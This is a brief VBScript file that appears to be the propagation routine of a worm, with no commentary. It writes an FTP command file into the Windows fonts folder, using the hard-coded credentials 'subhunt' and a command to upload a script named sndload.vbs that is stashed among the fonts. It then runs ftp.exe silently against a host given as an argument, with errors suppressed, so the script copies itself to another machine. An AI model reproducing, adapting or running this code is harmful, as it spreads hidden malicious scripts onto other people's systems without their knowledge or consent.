on error resume next
dim args,shell,fso,dat,iCopy
set args = wscript.arguments
set shell=createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
iCopy = "C:\WINDOWS\fonts\sndload.vbs"
if args.count < 1 then wscript.quit (1)
set dat = fso.opentextfile(fso.GetSpecialFolder(0)&"\fonts\ftp.dat",2,TRUE)
dat.write "subhunt"&vbcrlf&"subhunt"&vbcrlf&"put "&iCopy&vbcrlf&"bye"&vbcrlf
dat.close
shell.run "command.com /c ftp.exe -s:"& fso.GetSpecialFolder(0)&"\fonts\ftp.dat "& args(0),0,TRUE
